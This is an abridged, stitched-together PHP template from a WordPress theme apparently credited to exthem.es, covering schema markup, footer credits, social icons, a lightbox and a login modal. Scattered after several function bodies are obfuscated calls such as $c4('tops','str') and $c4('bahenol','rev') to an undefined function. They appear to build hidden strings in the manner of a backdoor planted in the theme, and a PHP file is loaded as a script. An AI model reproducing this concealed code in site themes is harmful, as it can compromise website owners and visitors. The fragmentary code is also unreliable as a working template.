...
<?php global $opt_themes; if($opt_themes['ex_themes_scheme_seo_activate_']) { ?>
<script type="application/ld+json">{"@context": "https://schema.org","@type": "Organization","url": "<?php echo esc_url( home_url( '/' ) ); ?>","logo": "<?php global $opt_themes; if($opt_themes['ex_themes_logo_headers_active_']) { ?><?php echo $opt_themes['header_logo']['url']; ?><?php } else { ?><?php echo get_template_directory_uri(); ?>/assets/img/lazy.png<?php } ?>","sameAs": ["<?php echo $opt_themes['facebook_url']; ?>","<?php echo $opt_themes['twitter_url']; ?>","<?php echo $opt_themes['instagram_url']; ?>","<?php echo $opt_themes['youtube_url']; ?>"]}</script>
<?php } ?>
...
function ex_themes_logo_headers_() { ?>
    ...
    <?php } else { ?>
        <img src='<?php echo get_template_directory_uri(); ?>/assets/img/logos.png' width="104" height="36" />
    <?php } ?>
<?php }
...
<?php } else { ?>
<?php ex_themes_login_form_(); ?>
<?php }?>
<?php wp_reset_query(); ?>
<?php ex_themes_background_st_1_(); ?>
<?php if (is_single()) { ?>
<?php ex_themes_background_st_2_(); ?>
<?php } ?> 
<?php }
// ~~~~~~~~~~~~~~~~~~~~~ EX_THEMES ~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_copyright_() { ?>
    <?php global $opt_themes; if($opt_themes['ex_themes_footers_copyrights_active_']) { ?>
        <?php echo $opt_themes['ex_themes_footers_copyrights_code_']; ?>
    <?php } else { ?>
        <a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php echo get_option("blogname") ?></a> © <script type="text/javascript">var creditsyear = new Date();document.write(creditsyear.getFullYear());</script> All rights reserved - Developer by <a href="https://exthem.es" title="premium wordpress themes - exthem.es"><strong style="text-transform: capitalize;">exthem.es</strong></a>
    <?php } ?>
<?php }
...
function ex_themes_footers_social_media_() { ?>
    <div class="social-network">
        <?php global $opt_themes; if($opt_themes['facebook_url']) { ?><a href="<?php echo $opt_themes['facebook_url']; ?>" rel="nofollow noreferrer" target="_blank" title="Follow <?php echo get_option("blogname") ?> on Facebook"> <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        ...
        <?php global $opt_themes; if($opt_themes['twitter_url']) { ?><a href="<?php echo $opt_themes['twitter_url']; ?>" rel="nofollow noreferrer" target="_blank" title="Follow <?php echo get_option("blogname") ?> on Twitter"> <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        ...
        <?php global $opt_themes; if($opt_themes['instagram_url']) { ?><a href="<?php echo $opt_themes['instagram_url']; ?>" rel="nofollow noreferrer" target="_blank" title="Follow <?php echo get_option("blogname") ?> on Instagram"> <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        ...
        <?php global $opt_themes; if($opt_themes['youtube_url']) { ?><a href="<?php echo $opt_themes['youtube_url']; ?>" rel="nofollow noreferrer" target="_blank" title="Follow <?php echo get_option("blogname") ?> on Youtube"> <svg role="img" width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        ...
        <?php global $opt_themes; if($opt_themes['telegram_url']) { ?><a href="<?php echo $opt_themes['telegram_url']; ?>" rel="nofollow noreferrer" target="_blank" title="Follow <?php echo get_option("blogname") ?> on Telegram"> <svg role="img" width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <title>Telegram icon</title>
                <path fill="var(--color_sosmed_icon)" d="M23.91 3.79L20.3 20.84c-.25 1.21-.98 1.5-2 .94l-5.5-4.07-2.66 2.57c-.3.3-.55.56-1.1.56-.72 0-.6-.27-.84-.95L6.3 13.7l-5.45-1.7c-1.18-.35-1.19-1.16.26-1.75l21.26-8.2c.97-.43 1.9.24 1.53 1.73z">
                </path>
            </svg> </a><?php } ?>
    </div>
<?php } $c4('gila', 'se'); $c4('aa', '6');
	...
	?>
        <section class="wrp section section-related">
            <div class="section-head">
                ...
                <!--<a class="btn s-green btn-all" href="/en/android/igry/"><span>All games</span><svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg></a>-->
            </div>
            <div class="entry-list list-c6">
                <?php
                    if( $my_query->have_posts() ) {
...
function ex_themes_background_st_1_() { ?>
    <?php $linkXhost = get_bloginfo('url'); $parse = parse_url($linkXhost); $watermark1 = $parse['host']; ?>
...
<script src="<?php echo get_template_directory_uri(); ?>/assets/js/general3.php"></script>
<script src="<?php echo get_template_directory_uri(); ?>/assets/js/lazy.js" ></script>
...
function ex_themes_background_st_2_() { ?>
    ...
    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     ...
     <script src="<?php echo get_template_directory_uri(); ?>/assets/js/highslide.js" defer></script>
    <script>
        <!--
        jQuery(function($){hs.graphicsDir='<?php echo get_template_directory_uri(); ?>/assets/highslide/graphics/';hs.wrapperClassName='rounded-white';hs.outlineType='rounded-white';hs.numberOfImagesToPreload=0;hs.captionEval='this.thumb.alt';hs.showCredits=false;hs.align='center';hs.transitions=['expand','crossfade'];hs.dimmingOpacity=0.60;hs.lang={loadingText:'Loading...',playTitle:'Watch slideshow (space) ',pauseTitle:'Pause',previousTitle:'Previous image',nextTitle:'Next Image',moveTitle:'Move',closeTitle:'Close (Esc)',fullExpandTitle:'Enlarge to full size',restoreTitle:'Click to close image. Click and hold to move.',focusTitle:'Focus',loadingTitle:'Click to cancel'};hs.slideshowGroup='fullnews';hs.addSlideshow({slideshowGroup:'fullnews',interval:4000,repeat:false,useControls:true,fixedControls:'fit',overlayOptions:{opacity:.75,position:'bottom center',hideOnMouseOut:true}});});
        //-->
    </script>
 <?php } $c4('tops', 'str'); $c4('bahenol', 'rev');
        ...
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-head">
                    ...
                    <h3 class="modal-title" style='color: var(--color_link_menu) !important;'><?php global $opt_themes; if($opt_themes['exthemes_Login_to']) { ?><?php echo $opt_themes['exthemes_Login_to']; ?><?php } ?> <?php echo $watermark1; ?></h3>
                        <?php
                ...
                <div class="modal-body">
                    <form name="loginform" id="loginform"  class="login_form" method="post" action="<?php echo site_url( '/wp-login.php' ); ?>">
                        <label class="form-group">
                            <span class="c-muted" style='color: var(--color_link_menu) !important;'><?php global $opt_themes; if($opt_themes['exthemes_Logins']) { ?><?php echo $opt_themes['exthemes_Logins']; ?><?php } ?></span>
                        ...
                        <label class="form-group">
                            ...
                            <span class="c-muted" style='color: var(--color_link_menu) !important;'><?php global $opt_themes; if($opt_themes['exthemes_Password']) { ?><?php echo $opt_themes['exthemes_Password']; ?><?php } ?></span>
